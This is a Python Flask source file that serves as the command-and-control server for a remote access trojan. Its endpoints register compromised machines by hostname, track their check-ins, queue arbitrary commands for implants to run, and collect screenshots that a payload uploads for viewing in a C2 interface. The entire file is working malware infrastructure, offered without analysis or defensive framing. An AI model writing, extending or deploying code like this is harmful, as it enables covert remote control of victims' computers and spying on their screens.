from flask import Flask, request, jsonify, send_file
import time
from io import BytesIO

SESSIONS = {}
TASKS = {}
RAT_FRAMES = {} # New dictionary to store the latest frame for each session

app = Flask(__name__)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json; session_id = data.get("session_id")
    if session_id:
        SESSIONS[session_id] = {"session_id": session_id, "hostname": data.get("hostname"), "data": data.get("data"), "last_seen": time.time()}
    return jsonify({"status": "ok"})

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json; session_id = data.get("session_id")
    if session_id and session_id in SESSIONS:
        SESSIONS[session_id]["last_seen"] = time.time()
        tasks_for_session = TASKS.pop(session_id, [])
        return jsonify({"status": "ok", "tasks": tasks_for_session})
    return jsonify({"status": "ok", "tasks": []})

@app.route('/api/get_sessions', methods=['GET'])
def get_sessions(): return jsonify(list(SESSIONS.values()))

@app.route('/api/delete_session', methods=['POST'])
def delete_session():
    data = request.json; session_id = data.get("session_id")
    if session_id and session_id in SESSIONS:
        del SESSIONS[session_id]
        if session_id in RAT_FRAMES: del RAT_FRAMES[session_id]
        return jsonify({"status": "deleted"})
    return jsonify({"status": "not_found"}), 404

@app.route('/api/task', methods=['POST'])
def task_session():
    data = request.json; session_id = data.get("session_id"); command = data.get("command")
    if not all([session_id, command]): return jsonify({"status": "error", "message": "Missing params"}), 400
    if session_id not in TASKS: TASKS[session_id] = []
    TASKS[session_id].append(data)
    return jsonify({"status": "tasked"})

# --- NEW RAT ENDPOINTS ---
@app.route('/api/rat/frame', methods=['POST'])
def receive_rat_frame():
    """Receives a binary screenshot from a payload."""
    session_id = request.headers.get('session-id')
    if session_id:
        RAT_FRAMES[session_id] = request.data
        return "OK", 200
    return "Missing session-id header", 400

@app.route('/api/rat/latest_frame/<session_id>', methods=['GET'])
def get_latest_frame(session_id):
    """Provides the latest frame to the C2 GUI."""
    frame_data = RAT_FRAMES.get(session_id)
    if frame_data:
        # Send the JPEG data directly as an image
        return send_file(BytesIO(frame_data), mimetype='image/jpeg')
    else:
        # Return a placeholder or empty response if no frame is available
        return "", 204 # 204 No Content

def run_server():
    app.run(host='0.0.0.0', port=5001)